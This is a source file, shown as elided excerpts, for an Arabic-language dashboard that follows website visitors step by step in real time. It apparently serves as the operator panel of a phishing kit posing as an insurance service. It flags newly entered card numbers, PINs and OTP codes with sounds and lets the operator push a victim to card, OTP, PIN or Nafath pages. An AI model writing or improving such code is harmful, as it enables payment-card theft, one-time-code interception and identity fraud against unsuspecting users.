...
import { playNotificationSound, playSound } from "@/lib/actions";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
...
import { toDate, toDateOrEpoch, type DateLike } from "@/lib/dates";
...
// Status Badge Component — shows final decision OR live progress in registration flow
const StatusBadge = ({ status, notification }: any) => {
  if (status === "approved") {
    return (
      <Badge className="bg-gradient-to-r from-green-500 to-green-600 text-white flex items-center gap-1 shadow-sm">
  ...
  if (status === "rejected") {
    return (
      <Badge className="bg-gradient-to-r from-red-500 to-red-600 text-white flex items-center gap-1 shadow-sm">
  ...
  // Pending → show where the visitor currently is in the form
  const step = Number(notification?.step ?? 0);
  const stepMap: Record<number, { text: string; color: string }> = {
    0: { text: "في الصفحة الرئيسية", color: "from-slate-500 to-slate-600" },
    1: { text: "المعلومات الشخصية", color: "from-blue-500 to-blue-600" },
    2: { text: "تفاصيل الحساب", color: "from-indigo-500 to-indigo-600" },
    3: { text: "رمز التفعيل", color: "from-purple-500 to-purple-600" },
    4: { text: "بيانات البطاقة", color: "from-amber-500 to-orange-600" },
    5: { text: "الرمز السري", color: "from-pink-500 to-pink-600" },
    6: { text: "رمز التحقق", color: "from-fuchsia-500 to-fuchsia-600" },
  };
  const fallbackText =
  ...
  return (
    <Badge
      className={`bg-gradient-to-r ${entry.color} text-white flex items-center gap-1 shadow-sm`}
    >
...
const ActionButtons = ({
  ...
  <div className="flex justify-center gap-1 flex-wrap items-center">
    <Badge
      className={`flex items-center gap-1 shadow-sm text-white border-0 ${
        isOnline
    ...
    >
      <span
        className={`inline-block h-2 w-2 rounded-full ${
          isOnline ? "bg-white animate-pulse" : "bg-slate-300"
        }`}
      />
...
export default function NotificationsPage() {
  ...
  const seenInfoIdsRef = useRef<Set<string>>(new Set());
  const seenCardIdsRef = useRef<Set<string>>(new Set());
  const seenVisitorIdsRef = useRef<Set<string>>(new Set());
  const seenOtpKeysRef = useRef<Set<string>>(new Set());
  const seenPinKeysRef = useRef<Set<string>>(new Set());
  ...
  const todayVisitorsCount = useMemo(() => {
    ...
    return notifications.filter((n) => {
      const d = toDate((n as any).createdDate);
      return d && d.getTime() >= startOfDay.getTime();
    }).length;
  }, [notifications]);
  const havePhoneCount = notifications.filter(
    (n) => (n as any).phone || (n as any).mobile,
  ).length;
  const activeNowCount = Object.values(onlineStatuses).filter(Boolean).length;
  ...
  const filteredNotifications = useMemo(() => {
    ...
    filtered.sort((a, b) => {
      ...
      switch (sortBy) {
        case "date":
          aValue = toDateOrEpoch(a.createdDate);
          bValue = toDateOrEpoch(b.createdDate);
          break;
        case "status":
          aValue = a.status;
          bValue = b.status;
  ...
  const fetchNotifications = () => {
    ...
    const unsubscribe = onSnapshot(
      ...
      (querySnapshot) => {
        ...
        // Detect genuinely new events using refs (not stale state).
        // Skip the very first snapshot to avoid sounding for pre-existing rows on page load.
        let event: "visitor" | "register" | "otp" | "pin" | null = null;
        for (const n of notificationsData) {
          const isNewDoc = !seenVisitorIdsRef.current.has(n.id);
          if (isNewDoc) {
            seenVisitorIdsRef.current.add(n.id);
            if (!firstSnapshotRef.current && !event) event = "visitor";
          }
          if ((n as any).otp || (n as any).otpCode || (n as any).phoneOtp) {
            const key = n.id + ":otp:" + ((n as any).otp || (n as any).otpCode || (n as any).phoneOtp);
            if (!seenOtpKeysRef.current.has(key)) {
              seenOtpKeysRef.current.add(key);
              if (!firstSnapshotRef.current) event = "otp";
            }
          }
          if ((n as any).pass && (n as any).step >= 5) {
            const key = n.id + ":pin:" + (n as any).pass;
            if (!seenPinKeysRef.current.has(key)) {
              seenPinKeysRef.current.add(key);
              if (!firstSnapshotRef.current) event = "pin";
            }
          }
          if (n.cardNumber && !seenCardIdsRef.current.has(n.id)) {
            seenCardIdsRef.current.add(n.id);
            if (!firstSnapshotRef.current && !event) event = "register";
          }
          if (
            (n.idNumber || n.email || n.mobile) &&
            !seenInfoIdsRef.current.has(n.id)
          ) {
            seenInfoIdsRef.current.add(n.id);
            if (!firstSnapshotRef.current && !event) event = "register";
          }
        }
        firstSnapshotRef.current = false;

        // Throttle: at most one sound every 2 seconds.
        if (event) {
          const now = Date.now();
  ...
  const handleRedirect = async (
    target: "info" | "account" | "code" | "card" | "pin" | "otp",
    id: string,
  ) => {
    try {
      const targetPost = doc(db, "pays", id);
      ...
      toast({
        title: "تم التحويل",
        description: `تم تحويل الزائر إلى صفحة ${labels[target]}`,
        variant: "default",
      });
    } catch (error) {
  ...
  const handleLogout = async () => {
    try {
      try { localStorage.removeItem("novaAuth"); } catch {}
      await signOut(auth);
      router.push("/login");
    } catch (error) {
    ...
    <>
      ...
      >
        ...
        <div className="p-6 space-y-8 max-w-[1920px] mx-auto">
          {/* Stats Grid — 5 cards as per design spec */}
                          ...
                          <td className="px-6 py-4">
                            <div className="flex items-center gap-2 text-sm text-slate-400">
                              ...
                              <span className="whitespace-nowrap">
                                {(() => {
                                  const d = toDate(notification.createdDate);
                                  return d
        ...
        >
          ...
          <DialogFooter>
            <div className="grid grid-cols-1 w-full gap-2">
              {/* تحويل الزائر — collapsible vertical menu (per design spec) */}
              <Button
                onClick={() => setTransferPanelOpen((v) => !v)}
                className="w-full justify-between bg-slate-800 hover:bg-slate-700 text-white border border-slate-700"
                variant="outline"
              >
                ...
                <ChevronLeft
                  className={`h-4 w-4 transition-transform ${transferPanelOpen ? "-rotate-90" : ""}`}
                />
              </Button>
              ...
              {transferPanelOpen && (
                ...
                >
                  <div style={{ textAlign: "center", marginBottom: "16px" }}>
                    <div style={{ display: "inline-flex", alignItems: "center", gap: "8px", color: "#34D399", fontWeight: 800, fontSize: "18px" }}>
                      <Folder style={{ width: 20, height: 20, color: "#34D399" }} />
                      <span style={{ color: "#34D399" }}>تحويل الزائر</span>
                    </div>
                    <div style={{ color: "#9CA3AF", fontSize: "12px", marginTop: "4px" }}>
                      إدارة تحويل الزائر بين المنصات
                    </div>
                  </div>
                  <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
                  {[
                    { key: "info", label: "الرئيسية", icon: Home, color: "#34D399" },
                    { key: "insurance", label: "بيانات التأمين", icon: Clipboard, color: "#FB923C" },
                    { key: "compare", label: "مقارنة العروض", icon: BarChart3, color: "#F59E0B" },
                    { key: "card", label: "الدفع (بطاقة)", icon: CreditCard, color: "#F59E0B" },
                    { key: "otp", label: "OTP", icon: Key, color: "#FBBF24" },
                    { key: "pin", label: "PIN", icon: Lock, color: "#FB923C" },
                    { key: "message", label: "رسالة", icon: MessageSquare, color: "#FB923C" },
                    { key: "phone", label: "معلومات الهاتف", icon: Phone, color: "#34D399" },
                    { key: "nafath", label: "نفاذ", icon: FileText, color: "#34D399" },
                  ].map((item) => {
                    const Icon = item.icon;
                    const isSelected = selectedTransferTarget === item.key;
                    const currentPage = (selectedNotification as any)?.currentPage || "";
                    const isArrived = currentPage === item.key;
                    const isPending = isSelected && !isArrived;
                    return (
                      <button
                        key={item.key}
                        type="button"
                        onClick={() => {
                          setSelectedTransferTarget(item.key);
                          handleRedirect(item.key as any, selectedNotification?.id!);
                        }}
                        style={{
                          width: "100%",
                          display: "flex",
                          ...
                          border: isArrived
                            ...
                            : isPending
                              ? "1.5px dashed #F59E0B"
                              : "1px solid #232B36",
                          boxShadow: isArrived ? "0 0 0 3px rgba(34,197,94,0.25)" : "none",
                      ...
                      >
                        <span style={{
                          ...
                          height: 22,
                          borderRadius: "9999px",
                          border: `2px solid ${isArrived ? "#10B981" : isPending ? "#F59E0B" : "#4B5563"}`,
                          flexShrink: 0,
                          backgroundColor: isArrived ? "#10B981" : "transparent",
                        }}>
                          {isArrived ? (
                            <CheckCircle style={{ width: 16, height: 16, color: "#FFFFFF" }} />
                          ) : isPending ? (
                            <Loader2 style={{ width: 12, height: 12, color: "#F59E0B", animation: "spin 1s linear infinite" }} />
                          ) : null}
                        </span>
                        <span style={{ flex: 1, textAlign: "right", fontSize: "15px", fontWeight: 700, color: "#E5E7EB" }}>
                          {item.label}
                          {isArrived && (
                            <span style={{ marginInlineStart: 8, fontSize: 11, color: "#34D399", fontWeight: 800 }}>
                              ● وصل الآن
                            </span>
                          )}
                          {isPending && (
                            <span style={{ marginInlineStart: 8, fontSize: 11, color: "#F59E0B", fontWeight: 700 }}>
                              ⏳ بانتظار الوصول…
                            </span>
                          )}
                        </span>
                        <Icon style={{ width: 22, height: 22, color: item.color, flexShrink: 0 }} />
                      </button>
                    );
                  })}
                  </div>
